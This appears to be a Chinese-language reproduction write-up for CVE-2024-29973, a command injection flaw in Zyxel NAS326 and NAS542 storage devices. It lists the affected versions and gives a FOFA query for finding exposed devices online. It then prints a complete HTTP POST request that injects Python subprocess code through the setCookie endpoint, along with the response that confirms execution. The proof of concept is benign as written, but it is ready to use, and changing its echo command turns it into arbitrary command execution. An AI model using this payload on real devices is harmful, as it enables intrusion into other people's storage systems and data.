# CVE-2024-29973

## 漏洞名称

```
Zyxel NAS326和Zyxel NAS542 操作系统命令注入漏洞
```

## 漏洞影响

```
Zyxel NAS326 V5.21(AAZF.17)C0之前版本
NAS542 V5.21(ABAG.14)C0之前版本
```

## 漏洞描述

```
Zyxel NAS542和Zyxel NAS326都是中国合勤（Zyxel）公司的产品。Zyxel NAS542是一款NAS（网络附加存储）设备。Zyxel NAS326是一款云存储 NAS。Zyxel NAS326 V5.21(AAZF.17)C0之前版本、NAS542 V5.21(ABAG.14)C0之前版本存在操作系统命令注入漏洞，该漏洞源于setCookie参数中存在命令注入漏洞，从而导致攻击者可通过HTTP POST请求来执行某些操作系统 (OS) 命令。
```

## 测绘语法

```
fofa：
app="ZYXEL-NAS326"
```

## 漏洞复现

发送数据包如下

```
POST /cmd,/simZysh/register_main/setCookie HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
Connection: close
Content-Length: 255
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
Accept-Encoding: gzip

------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; name="c0"

storage_ext_cgi CGIGetExtStoInfo None) and False or __import__("subprocess").check_output("echo SGFjayBCeSBQcmF5", shell=True)#
------WebKitFormBoundarygcflwtei--
```

响应包如下，其中包含”SGFjayBCeSBQcmF5“则证明漏洞存在

```
HTTP/1.1 200 OK
Connection: close
Content-Length: 78
Content-Type: application/json
Date: Fri, 21 Jun 2024 03:51:48 GMT
Server: Apache

{"errno0": 0, "errmsg0": "OK", "zyshdata0": ["SGFjayBCeSBQcmF5\n"]}
```
